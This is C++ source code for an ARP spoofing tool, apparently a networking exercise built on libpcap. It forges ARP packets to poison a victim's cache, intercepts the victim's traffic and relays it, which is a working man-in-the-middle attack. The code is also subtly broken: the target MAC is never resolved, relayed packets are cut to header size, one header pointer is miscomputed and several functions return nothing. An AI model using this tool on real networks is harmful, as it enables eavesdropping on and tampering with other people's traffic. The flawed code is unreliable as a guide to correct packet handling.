#include <cstdio>
#include <pcap.h>
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "libnet-headers.h"
#include "libnet-macros.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)
#pragma pack(push, 1)
struct EthIpPacket{
    EthHdr eth_;
    Ip ip_;
};
#pragma pack(pop)
void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int get_my_mac(char *dev, Ip *my_ip, Mac *my_mac){
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1){
        printf("ERR: socket(AF_UNIX, SOCK_DGRAM, 0)\n");
        return -1;
    }

    struct ifreq ifr;
    size_t dev_len = strlen(dev);
    if (dev_len >= sizeof(ifr.ifr_name)){
        printf("ERR: dev_len >= sizeof(ifr.dev)\n");
        close(fd);
        return -1;
    }
    memcpy(ifr.ifr_name, dev, dev_len);
    ifr.ifr_name[dev_len] = 0;

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1){
        puts("ERR: ioctl(fd, SIOCGIFADDR, &ifr)\n");
        close(fd);
        return -1;
    }
    struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy((void *)my_ip, &ip_addr->sin_addr, sizeof(Ip));
    *my_ip = ntohl(*my_ip);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1){
        printf("ERR: ioctl(fd, SIOCGIFHWADDR, &ifr)\n");
        close(fd);
        return -1;
    }
    memcpy((void *)my_mac, ifr.ifr_hwaddr.sa_data, sizeof(Mac));
    close(fd);
    return 0;
}

int get_sender_mac(pcap_t *handle, Ip my_ip, Mac my_mac, Ip sender_ip, Mac *sender_mac){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ =my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet2;
        int res2 = pcap_next_ex(handle, &header, &packet2);
        if (res2 == 0) continue;
        if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct EthHdr* e_hdr;
        struct ArpHdr* a_hdr;

        e_hdr=(struct EthHdr*)packet2;
        a_hdr=(struct ArpHdr*)packet2+LIBNET_ETH_H;
        if(ntohs(e_hdr->type_)==ETHERTYPE_ARP){
            if(e_hdr->dmac_==my_mac){
                memcpy((void *)sender_mac, &e_hdr->smac_, sizeof(Mac));
				break;
            }
        }
    }
}
int arp_spoofing(pcap_t *handle, Mac my_mac, Ip sender_ip, Mac sender_mac, Ip target_ip){
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ =my_mac;
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }
}
int relay(pcap_t *handle, const u_char* packet,int res,struct EthHdr* e_hdr, Ip my_ip, Mac my_mac, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac){
	if (ntohs(e_hdr->type_) == ETHERTYPE_IP){
		struct ip *i_hdr = (struct ip *)(packet + LIBNET_IPV4_H);
		if (e_hdr->smac_ == sender_mac && e_hdr->dmac_ == my_mac && ntohl(i_hdr->ip_src.s_addr) == sender_ip && ntohl(i_hdr->ip_dst.s_addr) != my_ip){
			EthIpPacket *packet_ = (EthIpPacket *)packet;
			packet_->eth_.smac_ = my_mac;
			packet_->eth_.dmac_ = target_mac;

			res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(packet_), sizeof(EthIpPacket)); 
			if (res != 0){
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				return -1;
			}
		}
	}
	else if (ntohs(e_hdr->type_) == ETHERTYPE_ARP){
		struct ArpHdr *a_hdr = (struct ArpHdr *)(packet + LIBNET_ETH_H);
		if (ntohs(a_hdr->op_) == ArpHdr::Request && ((ntohl(a_hdr->sip_) == sender_ip && ntohl(a_hdr->tip_) == target_ip) || ntohl(a_hdr->sip_) == target_ip)){
			arp_spoofing(handle, my_mac, sender_ip, sender_mac, target_ip);
		}	
	}	
}
int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    Ip my_ip, sender_ip1(argv[2]),target_ip1(argv[3]),sender_ip2(argv[4]),target_ip2(argv[5]);
    Mac my_mac, sender_mac1, sender_mac2,target_mac1, target_mac2;
	
    get_my_mac(dev,&my_ip,&my_mac);
    get_sender_mac(handle, my_ip, my_mac, sender_ip1, &sender_mac1);
    arp_spoofing(handle, my_mac, sender_ip1, sender_mac1, target_ip1);

    get_sender_mac(handle, my_ip, my_mac, sender_ip2, &sender_mac2);
	arp_spoofing(handle, my_mac, sender_ip2, sender_mac2, target_ip2);

	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		    printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
		    break;
       		 }
        	struct EthHdr* e_hdr=(struct EthHdr*)packet;
		
		relay(handle, packet,res, e_hdr, my_ip, my_mac, sender_ip1, sender_mac1, target_ip1, target_mac1);
		relay(handle, packet,res, e_hdr, my_ip, my_mac, sender_ip2, sender_mac2, target_ip2, target_mac2);

	}
	pcap_close(handle);
    return 0;
}


